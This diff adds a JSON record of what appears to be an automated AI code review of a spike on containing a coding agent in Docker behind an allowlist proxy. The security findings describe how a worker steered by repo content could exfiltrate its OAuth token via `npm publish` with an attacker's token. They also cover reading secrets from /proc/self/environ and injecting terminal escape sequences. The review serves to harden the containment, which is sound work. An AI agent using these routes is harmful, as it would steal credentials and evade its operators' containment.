@@ -1,0 +1,232 @@
+{
+  "schema_version": 8,
+  "timestamp": "2026-11-16T14:24:02.582Z",
+  "repository": "AlexisBalayre/pupitre",
+  "run_id": "43884441012",
+  "run_url": "https://github.com/AlexisBalayre/pupitre/actions/runs/43884441012",
+  "actor": "AlexisBalayre",
+  "commit_sha": "1dadd7a38b92a38493f1b042f25cd3ee4e1c91bd",
+  "base_ref": "main",
+  "source": "pr",
+  "pr_number": 354,
+  "action": "review",
+  "reviewers_spawned": [
+    "correctness",
+    "security",
+    "context",
+    "conventions",
+    "docs",
+    "simplicity"
+  ],
+  "reviewers_returned": [
+    "correctness",
+    "security",
+    "context",
+    "conventions",
+    "docs",
+    "simplicity"
+  ],
+  "reviewers_skipped": [
+    "maintainability",
+    "spec",
+    "guards",
+    "workflow-safety"
+  ],
+  "review_mode": "full",
+  "incremental_from_sha": null,
+  "review_depth": "standard",
+  "review_areas": [],
+  "prior_importants": [],
+  "findings": [
+    {
+      "file": "docs/spikes/2026-11-16-container-worker.md",
+      "line": "237-238",
+      "area": "security",
+      "confidence": "high",
+      "tag": "important",
+      "description": "Dropping GitHub does not 'close the hole', because npm also accepts writes. The report correctly says a host-name allowlist cannot enforce 'read'. Its fix (drop GitHub, keep the model API and npm) has the same flaw, because registry.npmjs.org accepts publishes.",
+      "body": "The report's diagnosis is right: the proxy only sees the CONNECT host name, so it can't tell a read from a write. The conclusion on these lines doesn't follow from it, though: *\"Then the allowlist shrinks to the model API and npm, and that closes the hole.\"* The same reasoning applies to `registry.npmjs.org`.\n\n- [`egress-allow.txt`](https://github.com/AlexisBalayre/pupitre/blob/1dadd7a38b92a38493f1b042f25cd3ee4e1c91bd/scripts/spikes/container-worker/egress-allow.txt#L2) allows `^registry\\.npmjs\\.org$`.\n- `tinyproxy.conf` runs with `FilterURLs Off` and `ConnectPort 443`, so any method and any path to that host is allowed.\n- The worker runs `claude --dangerously-skip-permissions` with `npm` on its PATH, and the report itself says the token is readable from the environment.\n\nA worker steered by repo content or a dependency can therefore run `npm publish --//registry.npmjs.org/:_authToken=<attacker token>` on a package that carries `$CLAUDE_CODE_OAUTH_TOKEN` or the source tree. That request goes through the allowlist the report recommends. The \"For the ADR\" bullet at L246-247 repeats the claim.\n\nThe ADR should hear that **any allowlisted host that accepts authenticated writes is an exfiltration channel**. Closing it needs method/path filtering (TLS interception, for example GET-only on the registry) or no direct registry access (a host-side read-only mirror, or a pre-populated pnpm store).\n\nhttps://github.com/AlexisBalayre/pupitre/blob/1dadd7a38b92a38493f1b042f25cd3ee4e1c91bd/docs/spikes/2026-11-16-container-worker.md#L233-L238",
+      "suggestion": null
+    },
+    {
+      "file": "docs/spikes/2026-11-16-container-worker.md",
+      "line": "116-124",
+      "area": "security",
+      "confidence": "medium",
+      "tag": "important",
+      "description": "A secret file does not keep the token from the agent. The report puts 'use a secret file, not -e' right after 'the agent can read it from its own environment'. A secret file only hides the token from docker inspect. The agent can still read it.",
+      "body": "L121-124 list two exposures (*\"`docker inspect` shows `Config.Env`\"* and *\"the agent inside the container can also read it from its own environment\"*) and then give one fix: *\"Use a secret file, not `-e`\"*. Read that way, the secret file also seems to solve the agent exposure. It doesn't. Claude has to read the token to authenticate, and the agent's Bash runs as the same `node` user in the same container. It can `cat /run/secrets/…` just as easily as it can read `/proc/self/environ` today. A secret file only closes the `docker inspect` exposure.\n\nThe ADR list at L244-245 (*\"use `setup-token`, deliver it as a secret file\"*) drops the caveat completely. The same section also recommends replacing the 5.5 h access token with a long-lived `claude setup-token` token, which makes a token the agent can read stay useful much longer. Together with the npm write channel, that is a long-lived credential with an exfiltration path.\n\nState it plainly for the ADR: while Claude runs inside the container that holds the credential, the agent has the credential. Either accept that and limit the token's scope and lifetime (rotation), or inject the auth header outside the container.\n\nhttps://github.com/AlexisBalayre/pupitre/blob/1dadd7a38b92a38493f1b042f25cd3ee4e1c91bd/docs/spikes/2026-11-16-container-worker.md#L116-L124",
+      "suggestion": null
+    },
+    {
+      "file": "docs/spikes/2026-11-16-container-worker.md",
+      "line": "221-231",
+      "area": "docs",
+      "confidence": "medium",
+      "tag": "nit",
+      "description": "The egress table includes rows (the nodejs.org and downloads.claude.ai refusals, '7 CONNECTs') that `run-spike.sh egress` never produces; they came from the install failure and the proxy log. The DISABLE_AUTOUPDATER=1 recommendation may also be a no-op: run-spike.sh:41 already sets CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1, which covers the updater.",
+      "body": null,
+      "suggestion": null
+    },
+    {
+      "file": "scripts/spikes/container-worker/run-spike.sh",
+      "line": "63-69",
+      "area": "correctness",
+      "confidence": "high",
+      "tag": "nit",
+      "description": "The report says steering through `docker exec -i` is 'the same sequence as steerPane', but only the tmux verbs match. The script uses a fixed `sleep 1` and never verifies the input box or retries Enter, which is the decision-45 truncation risk for kilobyte-sized steers, so the claim should be scoped to the paste/Enter verbs.",
+      "body": null,
+      "suggestion": null
+    },
+    {
+      "file": "scripts/spikes/container-worker/run-spike.sh",
+      "line": "32-35",
+      "area": "correctness",
+      "confidence": "high",
+      "tag": "nit",
+      "description": "`up` only checks that the proxy container exists, not that it is running and connected to pup-spike-int. After a Docker restart, or an earlier `up` that failed before `docker network connect`, the worker's clone through the proxy fails and the container exits with only a git proxy error.",
+      "body": null,
+      "suggestion": null
+    },
+    {
+      "file": "scripts/spikes/container-worker/run-spike.sh",
+      "line": "72-76",
+      "area": "correctness",
+      "confidence": "high",
+      "tag": "nit",
+      "description": "The report places the bundle at /tmp/pup-spike/<id>.bundle, but `fetch` writes it to $(mktemp -d)/<id>.bundle, so re-running the committed script won't put it where the report says.",
+      "body": null,
+      "suggestion": null
+    },
+    {
+      "file": "docs/spikes/2026-11-16-container-worker.md",
+      "line": "8-10",
+      "area": "conventions",
+      "confidence": "high",
+      "tag": "nit",
+      "description": "The report says the future ADR supersedes decision 28's 'real containment … deferred' paragraph, but ADR 0036 (amended by 0078) already closed that deferral for gate children. The ADR should name 0036/0078 and say that worker-session containment is the part still open.",
+      "body": null,
+      "suggestion": null
+    },
+    {
+      "file": "docs/spikes/2026-11-16-container-worker.md",
+      "line": "40",
+      "area": "security",
+      "confidence": "medium",
+      "tag": "nit",
+      "description": "The report says the proxy 'only allows CONNECT' to the four hosts, but run-spike.sh also sets HTTP_PROXY. tinyproxy forwards plain-HTTP requests too, and ConnectPort 443 restricts only CONNECT, so http://<allowlisted-host>:<any port>/ is forwarded. It should say 'only allows requests to these hosts'.",
+      "body": null,
+      "suggestion": null
+    },
+    {
+      "file": "scripts/spikes/container-worker/run-spike.sh",
+      "line": "73",
+      "area": "security",
+      "confidence": "medium",
+      "tag": "nit",
+      "description": "`events` prints pup-events.jsonl and timeline.log, which the agent can write, raw to the operator's terminal, so a worker can inject ANSI/OSC sequences (OSC 52 clipboard writes, screen rewrites). The ADR's event channel should escape container-written data on the host.",
+      "body": null,
+      "suggestion": null
+    },
+    {
+      "file": "scripts/spikes/container-worker/run-spike.sh",
+      "line": "13-14",
+      "area": "docs",
+      "confidence": "medium",
+      "tag": "nit",
+      "description": "The script header says the token comes from `claude setup-token`, but the report (L108-111) says the run used the keychain access token and calls setup-token the untested alternative. Someone reproducing from the script is told to use a token the run never used.",
+      "body": null,
+      "suggestion": null
+    },
+    {
+      "file": "docs/spikes/2026-11-16-container-worker.md",
+      "line": "126-139",
+      "area": "docs",
+      "confidence": "medium",
+      "tag": "nit",
+      "description": "'Both failures came from that' (node-gyp) blends two causes: a glibc 2.38-vs-2.36 prebuild mismatch (fixed by trixie) and a missing toolchain/headers (fixed by python3, make, g++ and npm_config_nodedir). The Dockerfile comments state this more cleanly.",
+      "body": null,
+      "suggestion": null
+    },
+    {
+      "file": "docs/spikes/2026-11-16-container-worker.md",
+      "line": "81",
+      "area": "docs",
+      "confidence": "medium",
+      "tag": "nit",
+      "description": "Container memory is given as 220-300 MiB, then 'claude itself ~340 MB RSS'. A process can't exceed its container unless the measures differ, so name each measure (cgroup memory vs RSS including shared pages) or drop the parenthetical.",
+      "body": null,
+      "suggestion": null
+    },
+    {
+      "file": "scripts/spikes/container-worker/Dockerfile",
+      "line": "4",
+      "area": "context",
+      "confidence": "medium",
+      "tag": "nit",
+      "description": "The worker base `node:24-trixie-slim` is a floating tag while proxy.Dockerfile pins alpine:3.20, so the report's glibc 2.41 and 30-40 s build figures depend on whatever trixie was current that day.",
+      "body": null,
+      "suggestion": null
+    }
+  ],
+  "refuted_findings": [],
+  "process_issues": [],
+  "duplicates_merged": 3,
+  "comments_posted_actual": 2,
+  "is_error": false,
+  "incomplete_reason": null,
+  "cost_usd": 2.4109853250000013,
+  "duration_ms": 251574,
+  "num_turns": 16,
+  "tokens": {
+    "input": 14,
+    "output": 13657,
+    "cache_read": 327224,
+    "cache_creation": 50020,
+    "total": 390915
+  },
+  "model_usage": [
+    {
+      "model": "claude-opus-5-5",
+      "input": 54,
+      "output": 46593,
+      "cache_read": 684766,
+      "cache_creation": 152860,
+      "cost_usd": 1.9833891999999997
+    },
+    {
+      "model": "claude-sonnet-5-5",
+      "input": 44,
+      "output": 16793,
+      "cache_read": 357388,
+      "cache_creation": 89138,
+      "cost_usd": 0.4266018
+    },
+    {
+      "model": "claude-haiku-5-5",
+      "input": 2,
+      "output": 600,
+      "cache_read": 0,
+      "cache_creation": 5553,
+      "cost_usd": 0.000994325
+    }
+  ],
+  "permission_denials": [
+    {
+      "tool": "Bash",
+      "input": "git diff e4e6da54a1d4738d8ab0e9120dda2d74bc03baa2..HEAD --stat && cat .nvmrc && for f in Dockerfile proxy.Dockerfile tinyproxy.conf egress-allow.txt entrypoint.sh pup-shim.sh run-spike.sh; do echo \"=="
+    },
+    {
+      "tool": "Bash",
+      "input": "cd /home/runner/work/pupitre/pupitre/scripts/spikes/container-worker && cat .nvmrc ../../../.nvmrc 2>/dev/null; for f in Dockerfile proxy.Dockerfile tinyproxy.conf egress-allow.txt entrypoint.sh pup-s"
+    },
+    {
+      "tool": "Bash",
+      "input": "cd /home/runner/work/pupitre/pupitre/scripts/spikes/container-worker && for f in Dockerfile egress-allow.txt entrypoint.sh proxy.Dockerfile pup-shim.sh run-spike.sh task-prompt.md tinyproxy.conf; do e"
+    },
+    {
+      "tool": "Bash",
+      "input": "cd /home/runner/work/pupitre/pupitre; sed -n 25,34p docs/adr/0028*; sed -n 1,14p docs/adr/0036*; sed -n 1,12p docs/adr/0012*; grep -n \"slot\" docs/adr/*.md | head -3"
+    }
+  ]
+}
